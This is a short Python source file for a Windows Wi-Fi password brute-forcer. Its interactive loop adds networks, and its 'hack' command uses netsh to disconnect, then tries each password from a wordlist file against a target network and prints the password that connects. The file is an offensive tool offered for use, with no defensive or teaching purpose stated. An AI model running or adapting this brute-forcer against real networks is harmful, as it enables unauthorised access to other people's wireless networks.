import time
from wifi_class import Wifi
import os
from terminal import *

nets=[]

print('WIFI BRUTEFORCER')

def hack(nets,cmd):
    """ hack id="net_id" key_list="path to file" """
    os.system("netsh wlan disconnect  >nul 2>&1")
    p=[]
    for i in range(len(cmd)):
        if cmd[i]=='"':
            p.append(i)
    id=int(cmd[p[0]+1:p[1]])
    f=open(cmd[p[2]+1:p[3]])
    key_list=[x.strip() for x in f]
    ln=len(key_list)
    nets[id-1].key='00000000'
    if key_list!=None:
        for i in range(len(key_list)):
            sys.stdout.write(f'\r {i+1}/{ln} passwords processed...')
            sys.stdout.flush()
            nets[id-1].key=key_list[i]
            print(nets[id-1].key)
            nets[id - 1].connect()
            if Wifi.is_connected():
                sys.stdout.flush()
                print(f'\r{key_list[i]} is pass')
                break
        else:
            print('pass is not in this list')

docs=''
while True:
    cmd=input()

    if cmd[:3]=='add':
        nets.append(add_net(cmd))

    if cmd=='exit':
        print('exiting the programm...')
        time.sleep(1)
        break

    if cmd=='disconnect':
        Wifi.disconnect()

    if cmd[:7] == 'connect':
        connect_net(cmd,nets)

    if cmd=='avilable':
        show_nets(nets)

    if cmd=='help':
        print(docs)

    if cmd[:4]=='hack':
        hack(nets,cmd)

    if cmd[:4]=='edit':
        pass










